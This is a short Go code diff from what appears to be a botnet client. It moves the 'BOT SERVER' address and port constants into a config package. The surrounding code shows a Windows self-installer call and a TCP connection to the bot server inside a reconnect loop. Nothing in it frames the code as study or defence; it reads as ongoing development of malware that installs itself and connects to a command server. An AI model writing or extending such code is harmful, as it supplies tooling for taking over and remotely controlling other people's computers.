@@ -5,15 +5,10 @@ import (
 	"encoding/base64"
 	"fmt"
 	"homo/client/balancer"
+	"homo/client/config"
 	"homo/client/installer"
 	"net"
 	"runtime"
-)
-
-// config
-const (
-	TARGET_SERVER = "127.0.0.1" // BOT SERVER
-	TARGET_PORT   = "9999"      // BOT PORT
 )
 
 type BalancerStats struct {
@@ -27,7 +22,7 @@ func main() {
 		installer.InstallerWin()
 	}
 CONNECT:
-	connection, err := net.Dial("tcp", TARGET_SERVER+":"+TARGET_PORT)
+	connection, err := net.Dial("tcp", config.TARGET_SERVER+":"+config.TARGET_PORT)
 
 	if err != nil {
 		fmt.Println(err)
